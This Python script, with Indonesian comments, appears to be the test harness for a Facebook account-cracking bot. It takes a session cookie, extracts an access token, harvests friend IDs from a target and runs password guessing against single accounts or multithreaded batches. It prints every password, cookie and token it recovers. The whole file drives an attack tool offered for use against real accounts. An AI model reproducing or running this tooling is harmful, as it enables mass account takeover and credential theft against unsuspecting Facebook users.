#!/usr/bin/env python3
"""
TEST REAL BOT CRACK FACEBOOK
Test dengan data real dari user untuk verify semua fungsi
"""

import sys
import os
from datetime import datetime
from core.auth import FacebookAuth
from core.dumper import FacebookDumper
from core.cracker import FacebookCracker

def banner():
    """Banner test"""
    print("="*60)
    print("🔥 TEST REAL - BOT CRACK FACEBOOK 🔥".center(60))
    print("="*60)
    print()

def test_login(cookie_str: str):
    """
    Test login dan extract token
    
    Args:
        cookie_str: Cookie Facebook
    """
    print("📝 TEST 1: LOGIN & EXTRACT TOKEN")
    print("-" * 60)
    
    try:
        auth = FacebookAuth()
        success, message, token = auth.save_cookie(cookie_str)
        
        print(f"Status: {'✅ BERHASIL' if success else '❌ GAGAL'}")
        print(f"Message: {message}")
        
        if token:
            print(f"Token: {token[:80]}...")
            print(f"Panjang token: {len(token)} karakter")
        
        print()
        return success, token
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        print()
        return False, None

def test_dump(cookie_str: str, token: str, target_id: str):
    """
    Test dump ID dari target
    
    Args:
        cookie_str: Cookie Facebook
        token: Access token
        target_id: ID target atau 'me'
    """
    print("📝 TEST 2: DUMP ID PUBLIK")
    print("-" * 60)
    
    try:
        dumper = FacebookDumper(cookie_str, token)
        
        def progress_callback(count):
            sys.stdout.write(f"\r💫 Progress: {count} ID berhasil di-dump")
            sys.stdout.flush()
        
        success, message, id_list = dumper.dump_public(target_id, progress_callback)
        
        print()
        print(f"Status: {'✅ BERHASIL' if success else '❌ GAGAL'}")
        print(f"Message: {message}")
        print(f"Total ID: {len(id_list)}")
        
        if id_list:
            print("\n📋 Sample ID (5 pertama):")
            for i, id_data in enumerate(id_list[:5], 1):
                print(f"  {i}. {id_data}")
        
        print()
        return success, id_list
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        print()
        return False, []

def test_crack_single(user_id: str, name: str, method: str = "mobile"):
    """
    Test crack single ID
    
    Args:
        user_id: ID Facebook
        name: Nama user
        method: Metode crack
    """
    print(f"📝 TEST 3: CRACK SINGLE ID - {method.upper()}")
    print("-" * 60)
    print(f"Target: {user_id} | {name}")
    print()
    
    try:
        cracker = FacebookCracker(max_workers=5)
        
        print("🔥 Memulai crack...")
        print(f"⚡ Metode: {method.upper()}")
        print(f"🔐 Testing 250+ kombinasi password...")
        print()
        
        result = cracker.crack_single(user_id, name, method, auto_fallback=True)
        
        if result:
            print(f"✅ HASIL: {result['type']}")
            print(f"   ID: {result['user_id']}")
            print(f"   Password: {result['password']}")
            if 'cookie' in result and result['cookie']:
                print(f"   Cookie: {result['cookie'][:80]}...")
            if 'token' in result and result['token']:
                print(f"   Token: {result['token'][:80]}...")
        else:
            print("❌ Tidak berhasil crack dengan semua metode")
        
        print()
        return result
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        print()
        return None

def test_crack_batch(id_list: list, method: str = "mobile", max_test: int = 10):
    """
    Test crack batch IDs
    
    Args:
        id_list: List ID untuk di-crack
        method: Metode crack
        max_test: Maksimal ID yang di-test
    """
    print(f"📝 TEST 4: CRACK BATCH - {method.upper()}")
    print("-" * 60)
    print(f"Total ID: {len(id_list)}")
    print(f"Testing: {min(max_test, len(id_list))} ID pertama")
    print()
    
    try:
        test_ids = id_list[:max_test]
        cracker = FacebookCracker(max_workers=10)
        
        def progress_callback(idx, stats):
            sys.stdout.write(
                f"\r⚡ Progress: {idx}/{stats['total']} | "
                f"✅ OK:{stats['ok']} | ⚠️ CP:{stats['cp']} | "
                f"❌ Failed:{stats['failed']}"
            )
            sys.stdout.flush()
        
        def result_callback(result):
            print()
            if result['type'] == 'OK':
                print(f"✅ SUKSES: {result['user_id']} | {result['password']}")
            elif result['type'] == 'CP':
                print(f"⚠️ CHECKPOINT: {result['user_id']} | {result['password']}")
        
        print("🔥 Memulai batch crack...")
        print(f"⚡ Metode: {method.upper()}")
        print(f"⚡ Workers: 10 threads paralel")
        print()
        
        stats = cracker.crack_batch(
            test_ids, 
            method=method,
            progress_callback=progress_callback,
            result_callback=result_callback
        )
        
        print("\n")
        print("="*60)
        print("📊 STATISTIK HASIL CRACK")
        print("="*60)
        print(f"Total ID: {stats['total']}")
        print(f"✅ Berhasil (OK): {stats['ok']}")
        print(f"⚠️ Checkpoint (CP): {stats['cp']}")
        print(f"❌ Gagal: {stats['failed']}")
        print(f"📈 Success Rate: {((stats['ok'] + stats['cp']) / stats['total'] * 100):.2f}%")
        print()
        
        return stats
        
    except Exception as e:
        print(f"❌ ERROR: {str(e)}")
        print()
        return None

def main():
    """Main test function"""
    banner()
    
    cookie = input("🔑 Masukkan cookie Facebook: ").strip()
    if not cookie:
        print("❌ Cookie tidak boleh kosong!")
        return
    
    print()
    print("="*60)
    print()
    
    success, token = test_login(cookie)
    
    if not success:
        print("❌ Login gagal! Tidak bisa lanjut test.")
        return
    
    choice = input("Pilih test:\n1. Test Crack Single ID\n2. Test Dump & Crack Batch\n\nPilihan (1/2): ").strip()
    print()
    print("="*60)
    print()
    
    if choice == "1":
        target_id = input("Masukkan ID target: ").strip()
        target_name = input("Masukkan nama target: ").strip()
        
        print()
        print("="*60)
        print()
        
        test_crack_single(target_id, target_name, "mobile")
        
    elif choice == "2":
        dump_target = input("Masukkan ID untuk dump (atau 'me' untuk teman sendiri): ").strip()
        
        print()
        print("="*60)
        print()
        
        success, id_list = test_dump(cookie, token, dump_target)
        
        if not success or not id_list:
            print("❌ Dump gagal! Tidak bisa lanjut test crack.")
            return
        
        max_test = int(input(f"Berapa ID yang ingin di-test? (max {len(id_list)}): ").strip() or "10")
        
        print()
        print("="*60)
        print()
        
        test_crack_batch(id_list, "mobile", max_test)
    
    else:
        print("❌ Pilihan tidak valid!")
        return
    
    print()
    print("="*60)
    print("✅ TEST SELESAI")
    print("="*60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Test dibatalkan oleh user!")
    except Exception as e:
        print(f"\n\n❌ ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
